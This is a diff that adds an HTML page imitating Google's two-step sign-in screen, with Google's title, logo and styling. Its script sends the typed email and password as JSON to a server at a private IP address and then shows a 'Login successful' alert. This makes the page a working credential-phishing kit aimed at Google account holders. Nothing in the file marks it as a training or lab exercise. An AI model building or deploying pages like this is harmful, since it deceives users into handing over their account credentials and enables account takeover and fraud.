@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in - Google</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+            color: #202124;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+        }
+
+        .login-box {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+
+        .login-box.hidden {
+            display: none;
+        }
+
+        .logo {
+            height: 24px;
+            margin-bottom: 16px;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 32px;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 32px;
+        }
+
+        .user-email {
+            font-size: 16px;
+            color: #5f6368;
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            padding: 8px;
+            cursor: pointer;
+            border-radius: 50%;
+        }
+
+        .back-button:hover {
+            background: #f1f3f4;
+        }
+
+        .back-button svg {
+            fill: #5f6368;
+        }
+
+        .login-form {
+            text-align: left;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-top: 8px;
+        }
+
+        input:focus {
+            border: 2px solid #1a73e8;
+            outline: none;
+        }
+
+        label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #5f6368;
+            pointer-events: none;
+            transition: 0.2s ease all;
+        }
+
+        input:focus + label,
+        input:valid + label {
+            top: 0;
+            font-size: 12px;
+            color: #1a73e8;
+            background: white;
+            padding: 0 5px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+            cursor: pointer;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: auto;
+            margin: 0 8px 0 0;
+            cursor: pointer;
+        }
+
+        .checkbox-container label {
+            position: static;
+            transform: none;
+            pointer-events: auto;
+            font-size: 14px;
+            color: #202124;
+            cursor: pointer;
+        }
+
+        .forgot-email,
+        .forgot-password {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            display: inline-block;
+            margin-bottom: 32px;
+        }
+
+        .guest-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+
+        .learn-more {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            margin-left: 5px;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .next-button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 9px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .next-button:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Email Step -->
+        <div id="emailStep" class="login-box">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+            <h2>Sign in</h2>
+            <p class="subtitle">Use your Google Account</p>
+            
+            <form class="login-form" onsubmit="return false;">
+                <div class="input-container">
+                    <input type="email" id="email" required>
+                    <label for="email">Email or phone</label>
+                </div>
+                
+                <a href="#" class="forgot-email">Forgot email?</a>
+                
+                <div class="guest-text">
+                    Not your computer? Use Guest mode to sign in privately.
+                    <a href="#" class="learn-more">Learn more</a>
+                </div>
+                
+                <div class="button-container">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="button" class="next-button">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Password Step -->
+        <div id="passwordStep" class="login-box hidden">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+            <h2>Welcome</h2>
+            <div class="user-info">
+                <span class="user-email"></span>
+                <button type="button" class="back-button">
+                    <svg height="24px" viewBox="0 0 24 24" width="24px" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+                    </svg>
+                </button>
+            </div>
+            
+            <form class="login-form" onsubmit="return false;">
+                <div class="input-container">
+                    <input type="password" id="password" required>
+                    <label for="password">Enter your password</label>
+                </div>
+                
+                <div class="checkbox-container">
+                    <input type="checkbox" id="show-password">
+                    <label for="show-password">Show password</label>
+                </div>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+                
+                <div class="button-container">
+                    <button type="button" class="next-button">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        // Setup floating labels
+        function setupFloatingLabel(input, label) {
+            const updateLabel = () => {
+                if (input.value || document.activeElement === input) {
+                    label.style.top = '0';
+                    label.style.fontSize = '12px';
+                    label.style.color = '#1a73e8';
+                    label.style.background = 'white';
+                    label.style.padding = '0 5px';
+                } else {
+                    label.style.top = '50%';
+                    label.style.fontSize = '16px';
+                    label.style.color = '#5f6368';
+                    label.style.background = 'transparent';
+                    label.style.padding = '0';
+                }
+            };
+
+            input.addEventListener('focus', updateLabel);
+            input.addEventListener('blur', updateLabel);
+            input.addEventListener('input', updateLabel);
+        }
+
+        // Setup password visibility toggle
+        const passwordInput = document.getElementById('password');
+        const showPasswordCheckbox = document.getElementById('show-password');
+        showPasswordCheckbox.addEventListener('change', () => {
+            passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
+        });
+
+        // Setup email step
+        const emailStep = document.getElementById('emailStep');
+        const passwordStep = document.getElementById('passwordStep');
+        const emailInput = document.getElementById('email');
+        const emailLabel = emailInput.nextElementSibling;
+        const passwordLabel = passwordInput.nextElementSibling;
+
+        setupFloatingLabel(emailInput, emailLabel);
+        setupFloatingLabel(passwordInput, passwordLabel);
+
+        // Setup navigation between steps
+        const nextButton = emailStep.querySelector('.next-button');
+        const backButton = document.querySelector('.back-button');
+        const userEmailSpan = document.querySelector('.user-email');
+
+        nextButton.addEventListener('click', () => {
+            if (emailInput.checkValidity()) {
+                emailStep.classList.add('hidden');
+                passwordStep.classList.remove('hidden');
+                userEmailSpan.textContent = emailInput.value;
+            } else {
+                emailInput.reportValidity();
+            }
+        });
+
+        backButton.addEventListener('click', () => {
+            passwordStep.classList.add('hidden');
+            emailStep.classList.remove('hidden');
+        });
+
+        // Setup form submission
+        const submitButton = passwordStep.querySelector('.next-button');
+
+        submitButton.addEventListener('click', () => {
+            if (passwordInput.checkValidity()) {
+                // Prepare data
+                const data = {
+                    email: emailInput.value,
+                    password: passwordInput.value
+                };
+
+                // Send data to the server
+                fetch('http://192.168.40.152:5000/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        return response.json();
+                    } else {
+                        throw new Error('Failed to login');
+                    }
+                })
+                .then(result => {
+                    alert('Login successful');
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert('Login failed');
+                });
+            } else {
+                passwordInput.reportValidity();
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
